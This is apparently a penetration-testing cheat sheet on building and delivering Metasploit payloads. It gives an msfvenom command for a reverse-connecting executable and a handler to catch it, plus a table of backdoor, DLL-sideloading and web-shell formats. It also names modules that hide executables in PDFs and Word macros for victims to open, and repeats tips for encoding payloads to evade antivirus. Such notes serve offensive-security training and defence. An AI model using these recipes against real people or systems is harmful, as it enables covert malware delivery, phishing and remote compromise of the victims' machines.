# Injecting Payload

## &#x20;Listener&#x20;

```bash
use exploit/multi/handler
```

## Msfvenom to other file

```bash
msfvenom -p <payload> LHOST=YOUR_IP LPORT=4444 -f exe -o payload.exe
```

{% embed url="https://www.clawnix.com/" %}

üß© `msfvenom` Payload Format Table

| Format Type              | `msfvenom` Flag (`-f`) | File Extension | Typical Use Case                             |
| ------------------------ | ---------------------- | -------------- | -------------------------------------------- |
| **Windows Binary**       | `exe`                  | `.exe`         | Windows executable backdoor or dropper       |
| **Dynamic Link Library** | `dll`                  | `.dll`         | DLL injection or sideloading                 |
| **PowerShell Script**    | `ps1`                  | `.ps1`         | In-memory execution via PowerShell           |
| **Batch Script**         | `raw` (as `.bat`)      | `.bat`         | Simple batch-based payload delivery          |
| **Shellcode (C)**        | `c`                    | `.c`           | Inject into custom C programs                |
| **Shellcode (Python)**   | `python`               | `.py`          | Use with Python loaders                      |
| **Shellcode (Raw)**      | `raw`                  | `.bin`         | Custom loaders or memory injection           |
| **HTA Payload**          | `hta-psh`              | `.hta`         | Used in phishing and browser-based delivery  |
| **Java Payload**         | `jar`                  | `.jar`         | For exploiting Java apps or JNLP delivery    |
| **Android APK**          | _(no flag needed)_     | `.apk`         | Android device backdoor                      |
| **Linux ELF**            | `elf`                  | `.elf`         | Executable on Linux systems                  |
| **macOS Mach-O**         | `macho`                | `.macho`       | Payloads for macOS targets                   |
| **PHP Web Shell**        | `raw`                  | `.php`         | Upload to web servers for command execution  |
| **ASP Web Shell**        | `asp`                  | `.asp`         | Exploit ASP-based web servers                |
| **JSP Web Shell**        | `jsp`                  | `.jsp`         | Target Java-based web servers (Tomcat, etc.) |

## PDF Payload

### Metasploit exploits

üìÑ `exploit/windows/fileformat/adobe_pdf_embedded_exe`

* **Description**: Embeds an EXE into a PDF using **JavaScript** for execution.
* **Technique**: Leverages **JavaScript triggers** inside the PDF to execute the embedded EXE when the victim opens the file.
* **More reliable** on older versions of Adobe Reader where JavaScript execution is enabled.
* **More likely to be flagged** by AV or sandbox because JavaScript in PDFs is a red flag.

#### üî• Pros:

* Higher chance of execution **if JavaScript is allowed**.
* Can be more dynamic and interactive (e.g., auto-launch on open).

#### ‚ùå Cons:

* Depends on **JavaScript being enabled** in Adobe Reader.
* Newer versions of Adobe Reader **disable or restrict JS** by default.
* Easier for security tools to detect.

{% hint style="warning" %}
To encode the pdf to avoid AV we need to use a custom msfvenom exe and not the default exploit exe, that we encoded and then on the exploit settings we set the exe
{% endhint %}

***

üìÑ `exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs`

* **Description**: Same as the above but **without JavaScript**.
* **Technique**: Embeds the EXE inside a PDF **without using JS to trigger it**.
* Requires **manual interaction** by the victim (e.g., double-clicking a file icon inside the PDF).
* Less suspicious to AV because it doesn‚Äôt rely on script-based triggers.

#### üî• Pros:

* **Better AV evasion** ‚Äî no JavaScript means fewer red flags.
* **Works even if JavaScript is disabled** in Adobe Reader.

#### ‚ùå Cons:

* **Less reliable** because it depends on user interaction.
* May be harder to convince someone to execute the embedded EXE.

{% hint style="warning" %}
To encode the pdf to avoid AV we need to use a custom msfvenom exe and not the default exploit exe, that we encoded and then on the exploit settings we set the exe
{% endhint %}

## &#x20;MS Word Payload

```
use exploit/windows/fileformat/office_word_macro
```

* Generates `.doc` file with VBA macro that drops & runs a payload.
* Works regardless of Office version **if macros are enabled**.
* AV may catch the macro or payload ‚Äî obfuscation is key.

{% hint style="warning" %}
To encode the word file to avoid AV we need to use a custom msfvenom exe and not the default exploit exe, that we encoded and then on the exploit settings we set the exe
{% endhint %}
